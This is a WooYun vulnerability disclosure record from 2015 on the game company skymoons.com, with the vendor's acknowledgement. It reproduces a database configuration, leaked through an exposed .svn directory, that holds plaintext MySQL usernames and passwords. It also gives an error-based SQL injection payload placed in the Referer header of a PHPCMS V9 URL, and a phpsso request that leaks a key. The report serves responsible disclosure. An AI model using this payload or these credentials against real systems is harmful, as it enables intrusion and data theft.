{"id": 70835, "wybug_id": "wooyun-2015-0131346", "wybug_title": "天象互动游戏漏洞打包(SQL注入漏洞/数据库敏感信息泄露等)", "wybug_corp": "skymoons.com", "wybug_author": "M4sk", "wybug_date": "2015-08-17 17:53", "wybug_open_date": "2015-09-29 18:10", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "敏感信息泄漏", "敏感信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-15：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-08-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-29：\t细节向公众公开  简要描述： RT 详细说明：  # 1 ：SVN信息泄露 导致 数据库敏感信息泄露http://**.**.**.**/.svn/entrieshttp://**.**.**.**/.svn/entries\n\n\n/*主表配置*/\t'DB'=>array(\t\t'main'=>array(\t\t\t'slaves'=>array(\t\t\t\t'connectionString' => 'mysql:host=**.**.**.**;dbname=sdk_dev',\t\t\t\t'masterRead' => false,\t\t\t//从库无效时 从主库读取\t\t\t\t'username' => 'sdk_dev',\t\t\t\t'password' => 'sdk_dev@2014',\t\t\t\t'charset' => 'utf8',\t\t\t\t'tablePrefix' => '',\t\t\t),\t\t\t'master'=>array(\t\t\t\t'connectionString' => 'mysql:host=**.**.**.**;dbname=sdk_dev',\t\t\t\t'slavesWrite' => false,\t\t\t\t'username' => 'sdk_dev',\t\t\t\t'password' => 'sdk_dev@2014',\t\t\t\t'charset' => 'utf8',\t\t\t\t'tablePrefix' => '',\t\t\t),\t\t),\t\t//其他库\t\t'localhost'=>array(\t\t\t'slaves'=>array(\t\t\t\t'connectionString' => 'mysql:host=**.**.**.**;dbname=wiki',\t\t\t\t'masterRead' => true,\t\t\t\t'username' => 'root',\t\t\t\t'password' => '123456',\t\t\t\t'charset' => 'utf8',\t\t\t\t'tablePrefix' => 'wiki_',\t\t\t),\t\t\t'master'=>array(\t\t\t\t'connectionString' => 'mysql:host=**.**.**.**;dbname=wiki',\t\t\t\t'slavesWrite' => true,\t\t\t\t'username' => 'root',\t\t\t\t'password' => '123456',\t\t\t\t'charset' => 'utf8',\t\t\t\t'tablePrefix' => 'wiki_',\t\t\t),\t\t),\t\t\t\t//251\t\t'test251'=>array(\t\t\t'slaves'=>array(\t\t\t\t'connectionString' => 'mysql:host=**.**.**.**;dbname=wiki',\t\t\t\t'masterRead' => true,\t\t\t\t'username' => 'chenchao',\t\t\t\t'password' => '123456',\t\t\t\t'charset' => 'utf8',\t\t\t\t'tablePrefix' => 'wiki_',\t\t\t),\t\t\t'master'=>array(\t\t\t\t'connectionString' => 'mysql:host=**.**.**.**;dbname=wiki',\t\t\t\t'slavesWrite' => true,\t\t\t\t'username' => 'chenchao',\t\t\t\t'password' => '123456',\t\t\t\t'charset' => 'utf8',\t\t\t\t'tablePrefix' => 'wiki_',\t\t\t),\t\t),\t\t\t\t\t\t//251\t\t'cskl251'=>array(\t\t\t'slaves'=>array(\t\t\t\t'connectionString' => 'mysql:host=**.**.**.**;dbname=cskl',\t\t\t\t'masterRead' => true,\t\t\t\t'username' => 'chenchao',\t\t\t\t'password' => '123456',\t\t\t\t'charset' => 'utf8',\t\t\t\t'tablePrefix' => '',\t\t\t),\t\t\t'master'=>array(\t\t\t\t'connectionString' => 'mysql:host=**.**.**.**;dbname=cskl',\t\t\t\t'slavesWrite' => true,\t\t\t\t'username' => 'chenchao',\t\t\t\t'password' => '123456',\t\t\t\t'charset' => 'utf8',\t\t\t\t'tablePrefix' => '',\t\t\t),\t\t),\t\t\t\t'jorgame'=>array(\t\t\t'slaves'=>array(\t\t\t\t'connectionString' => 'mysql:host=**.**.**.**;port=8904;dbname=sdklog',\t\t\t\t'masterRead' => true,\t\t\t\t'username' => 'root',\t\t\t\t'password' => 'zr_123',\t\t\t\t'charset' => 'utf8',\t\t\t\t'tablePrefix' => '',\t\t\t),\t\t\t'master'=>array(\t\t\t\t'connectionString' => 'mysql:host=**.**.**.**;port=8904;dbname=sdklog',\t\t\t\t'masterRead' => true,\t\t\t\t'username' => 'root',\t\t\t\t'password' => 'zr_123',\t\t\t\t'charset' => 'utf8',\t\t\t\t'tablePrefix' => '',\t\t\t),\t\t),\t\t\t\t'jorgamecom'=>array(\t\t\t'slaves'=>array(\t\t\t\t'connectionString' => 'mysql:host=**.**.**.**;port=8904;dbname=sdkcom',\t\t\t\t'masterRead' => true,\t\t\t\t'username' => 'root',\t\t\t\t'password' => 'zr_123',\t\t\t\t'charset' => 'utf8',\t\t\t\t'tablePrefix' => '',\t\t\t),\t\t\t'master'=>array(\t\t\t\t'connectionString' => 'mysql:host=**.**.**.**;port=8904;dbname=sdkcom',\t\t\t\t'masterRead' => true,\t\t\t\t'username' => 'root',\t\t\t\t'password' => 'zr_123',\t\t\t\t'charset' => 'utf8',\t\t\t\t'tablePrefix' => '',\t\t\t),\t\t),\t\t\t\t'tianxiangios'=>array(\t\t\t'slaves'=>array(\t\t\t\t'connectionString' => 'mysql:host=**.**.**.**;port=4302;dbname=andsdk',\t\t\t\t'masterRead' => true,\t\t\t\t'username' => 'root',\t\t\t\t'password' => 'GYqoNsfPBlkAcVczTw',\t\t\t\t'charset' => 'utf8',\t\t\t\t'tablePrefix' => '',\t\t\t),\t\t\t'master'=>array(\t\t\t\t'connectionString' => 'mysql:host=**.**.**.**;port=4302;dbname=andsdk',\t\t\t\t'masterRead' => true,\t\t\t\t'username' => 'root',\t\t\t\t'password' => 'GYqoNsfPBlkAcVczTw',\t\t\t\t'charset' => 'utf8',\t\t\t\t'tablePrefix' => '',\t\t\t),\t\t),\t\t\t),\t\t/*视图配置*/\t'TEMPLATE'=>array(\t\t\t\t//smarty模板\t\t'smarty' => array(\t\t\t'TEMPLATE_PATH'=> APP_PATH.'/vendors/smarty/libs/Smarty.class.php',\t\t\t'CONF_INFO'=>array(\t\t\t\t 'template_dir' => APP_PATH.'/application/views/default',\t\t#模板目录\t\t\t\t 'compile_dir' => APP_PATH.'/__runtime/script', \t\t\t\t#编译目录\t\t\t\t 'cache_dir' => APP_PATH.'/__runtime/html',\t\t\t     'left_delimiter' => '<{',\t\t\t     'right_delimiter' => '}>',\t\t\t     'allow_php_tag' => true,\t\t\t     'caching'=>false,\t\t\t     'cache_lifetime'=>100,\t\t\t)\t\t),\t\t\t\t\t),\n\n\n# 2 ： PHPCMS V9 的一个referer 注入url：http://**.**.**.**//index.php?m=poster&c=index&a=poster_click&id=1Referer:',(SELECT 1 FROM(SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))X FROM information_schema.tables GROUP BY X)a),'1')#\n\n\n\n# 3 ： 一个skey的泄露http://**.**.**.**/phpsso_server/index.php?m=phpsso&c=index&a=getapplist&auth_data=v=1&appid=1&data=e5c2VAMGUQZRAQkIUQQKVwFUAgICVgAIAldVBQFDDQVcV0MUQGkAQxVZZlMEGA9+DjZoK1AHRmUwBGcOXW5UDgQhJDxaeQVnGAdxVRcKQ乌云有相关的利用文章 我就不演示了http://**.**.**.**/bugs/wooyun-2015-0105242该去吃饭了~~   漏洞证明：  综上   修复方案：  自查   版权声明：转载请注明来源 M4sk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-08-15 18:08 厂商回复： 感谢对我们安全工作的关心！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-03 23:30 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1213 漏洞数:321        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  额 这个咋交由CNcert处理了~    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}